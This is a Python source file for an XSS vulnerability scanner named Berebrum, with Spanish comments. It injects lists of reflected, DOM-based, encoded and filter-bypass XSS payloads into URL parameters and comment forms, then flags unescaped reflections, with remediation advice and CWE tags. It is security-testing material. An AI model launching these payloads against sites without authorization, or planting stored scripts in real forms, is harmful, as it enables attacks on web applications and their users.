"""
XSS Detector - Berebrum
Detecta vulnerabilidades de Cross-Site Scripting con Attack Flow completo
"""

import requests
import urllib3
from typing import Dict, List, Optional
from datetime import datetime
import re
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class XSSDetector:
    """
    Detector de vulnerabilidades XSS (Cross-Site Scripting)
    Soporta: Reflected XSS, Stored XSS, DOM-based XSS
    """

    def __init__(self, timeout: float = 10.0):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update(
            {"User-Agent": "Mozilla/5.0 (Berebrum XSS Scanner/1.0)"}
        )
        self.session.verify = False

        # Payloads de XSS organizados por tipo
        self.payloads = {
            "basic": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                '"><script>alert(1)</script>',
                "'><script>alert(1)</script>",
            ],
            "advanced": [
                '<iframe src="javascript:alert(1)">',
                "<body onload=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<select onfocus=alert(1) autofocus>",
                "<textarea onfocus=alert(1) autofocus>",
                "<marquee onstart=alert(1)>",
                "<details open ontoggle=alert(1)>",
            ],
            "encoded": [
                "&lt;script&gt;alert(1)&lt;/script&gt;",
                "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
                "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
            ],
            "dom_based": [
                "#<script>alert(1)</script>",
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
            ],
            "filter_bypass": [
                "<scr<script>ipt>alert(1)</scr</script>ipt>",
                "<<SCRIPT>alert(1);//<</SCRIPT>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                '<img src="x" onerror="alert&#40;1&#41;">',
                "<svg><animatetransform onbegin=alert(1)>",
            ],
        }

        # Patrones de detección
        self.detection_patterns = [
            r"<script[^>]*>.*?alert\(.*?\)",
            r"<img[^>]*onerror\s*=",
            r"<svg[^>]*onload\s*=",
            r'<iframe[^>]*src\s*=\s*["\']?javascript:',
            r"<body[^>]*onload\s*=",
            r"javascript:alert\(",
            r'onerror\s*=\s*["\']?alert\(',
        ]

    def scan(self, target: str, scan_stored: bool = False) -> Dict:
        """
        Escanea el target en busca de XSS

        Args:
            target: URL a escanear
            scan_stored: Si True, verifica XSS almacenado

        Returns:
            Resultados del escaneo con Attack Flow
        """
        print(f"[*] Iniciando escaneo XSS en: {target}")

        vulnerabilities = []
        attack_flow = []
        step_counter = 0

        # Fase 1: Reconocimiento
        step_counter += 1
        recon_step = self._recon_phase(target, step_counter)
        attack_flow.append(recon_step)

        # Fase 2: Reflected XSS
        print("[*] Fase 2: Detectando Reflected XSS...")
        for payload_type, payloads in self.payloads.items():
            for payload in payloads:
                step_counter += 1
                result = self._test_reflected_xss(
                    target, payload, step_counter, payload_type
                )
                attack_flow.append(result["step"])

                if result["vulnerable"]:
                    vulnerabilities.append(result["vulnerability"])
                    print(f"[!] XSS Detectado: {payload_type} - {payload[:30]}...")

        # Fase 3: DOM-based XSS
        print("[*] Fase 3: Detectando DOM-based XSS...")
        step_counter += 1
        dom_result = self._test_dom_xss(target, step_counter)
        attack_flow.append(dom_result["step"])
        if dom_result["vulnerable"]:
            vulnerabilities.extend(dom_result["vulnerabilities"])

        # Fase 4: Stored XSS (si se solicita)
        if scan_stored:
            print("[*] Fase 4: Detectando Stored XSS...")
            step_counter += 1
            stored_result = self._test_stored_xss(target, step_counter)
            attack_flow.append(stored_result["step"])
            if stored_result["vulnerable"]:
                vulnerabilities.extend(stored_result["vulnerabilities"])

        # Calcular estadísticas
        vulnerable_steps = len(
            [s for s in attack_flow if s.get("detection", {}).get("vulnerable", False)]
        )
        techniques_detected = list(set([v["technique"] for v in vulnerabilities]))
        parameters_tested = list(set([v["parameter"] for v in vulnerabilities]))

        # Generar resumen
        attack_summary = {
            "total_steps": len(attack_flow),
            "vulnerable_steps": vulnerable_steps,
            "phases": ["Reconnaissance", "Reflected XSS", "DOM-based XSS"]
            + (["Stored XSS"] if scan_stored else []),
            "techniques_detected": techniques_detected,
            "parameters_tested": parameters_tested,
        }

        result = {
            "target": target,
            "scan_type": "xss",
            "timestamp": datetime.now().isoformat(),
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerability_count": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "attack_flow": attack_flow,
            "attack_summary": attack_summary,
            "severity": self._calculate_severity(vulnerabilities),
            "confidence": self._calculate_confidence(vulnerabilities),
        }

        print(
            f"[*] Escaneo completado: {len(vulnerabilities)} vulnerabilidades detectadas"
        )
        return result

    def _recon_phase(self, target: str, step: int) -> Dict:
        """Fase de reconocimiento inicial"""
        try:
            response = self.session.get(target, timeout=self.timeout)

            # Analizar formularios y parámetros
            forms_count = len(re.findall(r"<form[^>]*>", response.text, re.IGNORECASE))
            inputs_count = len(
                re.findall(r"<input[^>]*>", response.text, re.IGNORECASE)
            )

            return {
                "step": step,
                "phase": "Reconnaissance",
                "url": target,
                "payload": "N/A",
                "request": {
                    "method": "GET",
                    "headers": dict(self.session.headers),
                    "params": {},
                    "body": None,
                },
                "response": {
                    "status_code": response.status_code,
                    "time": response.elapsed.total_seconds(),
                    "size": len(response.content),
                    "headers": dict(response.headers),
                    "body": response.text[:500],
                },
                "detection": {
                    "vulnerable": False,
                    "technique": "recon",
                    "evidence": f"Forms: {forms_count}, Inputs: {inputs_count}",
                    "confidence": 0,
                },
            }
        except Exception as e:
            return {
                "step": step,
                "phase": "Reconnaissance",
                "url": target,
                "error": str(e),
            }

    def _test_reflected_xss(
        self, target: str, payload: str, step: int, payload_type: str
    ) -> Dict:
        """Prueba Reflected XSS"""
        try:
            # Parsear URL y agregar payload
            parsed = urlparse(target)
            params = parse_qs(parsed.query)

            # Si no hay parámetros, agregar uno de prueba
            if not params:
                params = {"q": [""]}

            # Inyectar payload en el primer parámetro
            param_name = list(params.keys())[0]
            params[param_name] = [payload]

            # Construir URL con payload
            new_query = urlencode(params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

            # Enviar request
            response = self.session.get(test_url, timeout=self.timeout)

            # Verificar si el payload aparece sin escape
            payload_reflected = payload in response.text
            payload_executed = any(
                re.search(pattern, response.text, re.IGNORECASE)
                for pattern in self.detection_patterns
            )

            vulnerable = payload_reflected and payload_executed

            result = {
                "step": {
                    "step": step,
                    "phase": "Reflected XSS Detection",
                    "url": test_url,
                    "payload": payload,
                    "request": {
                        "method": "GET",
                        "headers": dict(self.session.headers),
                        "params": params,
                        "body": None,
                    },
                    "response": {
                        "status_code": response.status_code,
                        "time": response.elapsed.total_seconds(),
                        "size": len(response.content),
                        "headers": dict(response.headers),
                        "body": response.text[:1000],
                    },
                    "detection": {
                        "vulnerable": vulnerable,
                        "technique": f"reflected_{payload_type}",
                        "evidence": (
                            f"Payload reflejado sin escape en la página"
                            if vulnerable
                            else "Payload no ejecutado"
                        ),
                        "confidence": 95 if vulnerable else 0,
                    },
                },
                "vulnerable": vulnerable,
                "vulnerability": None,
            }

            if vulnerable:
                result["vulnerability"] = {
                    "type": "XSS",
                    "subtype": "Reflected",
                    "severity": "High",
                    "cvss_score": 7.5,
                    "parameter": param_name,
                    "payload": payload,
                    "payload_type": payload_type,
                    "technique": f"reflected_{payload_type}",
                    "evidence": f"Payload '{payload}' se refleja sin sanitizar en la respuesta HTML",
                    "url": test_url,
                    "cwe_id": "CWE-79",
                    "remediation": "Sanitizar y escapar correctamente el input del usuario antes de reflejarlo en HTML",
                }

            return result

        except Exception as e:
            return {
                "step": {
                    "step": step,
                    "phase": "Reflected XSS Detection",
                    "url": target,
                    "error": str(e),
                },
                "vulnerable": False,
            }

    def _test_dom_xss(self, target: str, step: int) -> Dict:
        """Prueba DOM-based XSS"""
        vulnerabilities = []

        try:
            # Verificar si hay JavaScript que maneja el hash
            response = self.session.get(target, timeout=self.timeout)

            # Buscar patrones de DOM XSS
            dom_patterns = [
                r"location\.hash",
                r"document\.URL",
                r"document\.documentURI",
                r"document\.location",
                r"window\.location",
                r"document\.write\(",
                r"\.innerHTML\s*=",
            ]

            dom_sinks_found = []
            for pattern in dom_patterns:
                if re.search(pattern, response.text):
                    dom_sinks_found.append(pattern)

            vulnerable = len(dom_sinks_found) > 0

            if vulnerable:
                for sink in dom_sinks_found:
                    vulnerabilities.append(
                        {
                            "type": "XSS",
                            "subtype": "DOM-based",
                            "severity": "Medium",
                            "cvss_score": 6.5,
                            "parameter": "DOM sink",
                            "payload": "#<script>alert(1)</script>",
                            "payload_type": "dom_based",
                            "technique": "dom_based",
                            "evidence": f"JavaScript sink detectado: {sink}",
                            "url": target,
                            "cwe_id": "CWE-79",
                            "remediation": "Validar y sanitizar datos del DOM antes de usarlos en operaciones peligrosas",
                        }
                    )

            return {
                "step": {
                    "step": step,
                    "phase": "DOM-based XSS Detection",
                    "url": target,
                    "payload": "#<script>alert(1)</script>",
                    "request": {
                        "method": "GET",
                        "headers": dict(self.session.headers),
                        "params": {},
                        "body": None,
                    },
                    "response": {
                        "status_code": response.status_code,
                        "time": response.elapsed.total_seconds(),
                        "size": len(response.content),
                        "headers": dict(response.headers),
                        "body": response.text[:1000],
                    },
                    "detection": {
                        "vulnerable": vulnerable,
                        "technique": "dom_based",
                        "evidence": (
                            f"DOM sinks detectados: {', '.join(dom_sinks_found)}"
                            if vulnerable
                            else "No DOM sinks detectados"
                        ),
                        "confidence": 70 if vulnerable else 0,
                    },
                },
                "vulnerable": vulnerable,
                "vulnerabilities": vulnerabilities,
            }

        except Exception as e:
            return {
                "step": {
                    "step": step,
                    "phase": "DOM-based XSS Detection",
                    "url": target,
                    "error": str(e),
                },
                "vulnerable": False,
                "vulnerabilities": [],
            }

    def _test_stored_xss(self, target: str, step: int) -> Dict:
        """Prueba Stored XSS (básico)"""
        # Nota: Stored XSS requiere enviar datos y verificar después
        # Esta es una implementación básica
        try:
            payload = '<script>alert("XSS_STORED_TEST")</script>'

            # Intentar POST con payload
            response = self.session.post(
                target, data={"comment": payload, "name": "test"}, timeout=self.timeout
            )

            # Verificar si aparece en la respuesta
            vulnerable = payload in response.text

            result = {
                "step": {
                    "step": step,
                    "phase": "Stored XSS Detection",
                    "url": target,
                    "payload": payload,
                    "request": {
                        "method": "POST",
                        "headers": dict(self.session.headers),
                        "params": {},
                        "body": {"comment": payload, "name": "test"},
                    },
                    "response": {
                        "status_code": response.status_code,
                        "time": response.elapsed.total_seconds(),
                        "size": len(response.content),
                        "headers": dict(response.headers),
                        "body": response.text[:1000],
                    },
                    "detection": {
                        "vulnerable": vulnerable,
                        "technique": "stored",
                        "evidence": (
                            "Payload almacenado y reflejado sin escape"
                            if vulnerable
                            else "Payload no almacenado"
                        ),
                        "confidence": 90 if vulnerable else 0,
                    },
                },
                "vulnerable": vulnerable,
                "vulnerabilities": [],
            }

            if vulnerable:
                result["vulnerabilities"] = [
                    {
                        "type": "XSS",
                        "subtype": "Stored",
                        "severity": "Critical",
                        "cvss_score": 9.0,
                        "parameter": "comment",
                        "payload": payload,
                        "payload_type": "stored",
                        "technique": "stored",
                        "evidence": "Payload almacenado y ejecutado en página",
                        "url": target,
                        "cwe_id": "CWE-79",
                        "remediation": "Sanitizar y validar input antes de almacenar en base de datos",
                    }
                ]

            return result

        except Exception as e:
            return {
                "step": {
                    "step": step,
                    "phase": "Stored XSS Detection",
                    "url": target,
                    "error": str(e),
                },
                "vulnerable": False,
                "vulnerabilities": [],
            }

    def _calculate_severity(self, vulnerabilities: List[Dict]) -> str:
        """Calcula severidad general"""
        if not vulnerabilities:
            return "None"

        severity_scores = {"Critical": 4, "High": 3, "Medium": 2, "Low": 1, "None": 0}

        max_severity = max(
            [severity_scores.get(v["severity"], 0) for v in vulnerabilities]
        )

        for sev, score in severity_scores.items():
            if score == max_severity:
                return sev

        return "None"

    def _calculate_confidence(self, vulnerabilities: List[Dict]) -> int:
        """Calcula nivel de confianza"""
        if not vulnerabilities:
            return 0

        # Si hay Stored XSS → 95%
        if any(v["subtype"] == "Stored" for v in vulnerabilities):
            return 95

        # Si hay Reflected XSS → 90%
        if any(v["subtype"] == "Reflected" for v in vulnerabilities):
            return 90

        # Si solo DOM-based → 70%
        return 70


def main():
    """Ejemplo de uso"""
    detector = XSSDetector()

    # Escanear URL de prueba
    target = "http://testphp.vulnweb.com/search.php?test=query"

    print("=" * 60)
    print("XSS DETECTOR - BEREBRUM")
    print("=" * 60)

    result = detector.scan(target, scan_stored=False)

    print("\n" + "=" * 60)
    print("RESULTADOS")
    print("=" * 60)
    print(f"Target: {result['target']}")
    print(f"Vulnerable: {result['vulnerable']}")
    print(f"Vulnerabilities: {result['vulnerability_count']}")
    print(f"Severity: {result['severity']}")
    print(f"Confidence: {result['confidence']}%")

    if result["vulnerabilities"]:
        print("\nVulnerabilidades detectadas:")
        for vuln in result["vulnerabilities"]:
            print(f"  - {vuln['subtype']} XSS en parámetro '{vuln['parameter']}'")
            print(f"    Payload: {vuln['payload']}")
            print(f"    Severity: {vuln['severity']} (CVSS {vuln['cvss_score']})")

    print(f"\nAttack Flow: {result['attack_summary']['total_steps']} pasos")
    print(f"Pasos vulnerables: {result['attack_summary']['vulnerable_steps']}")


if __name__ == "__main__":
    main()
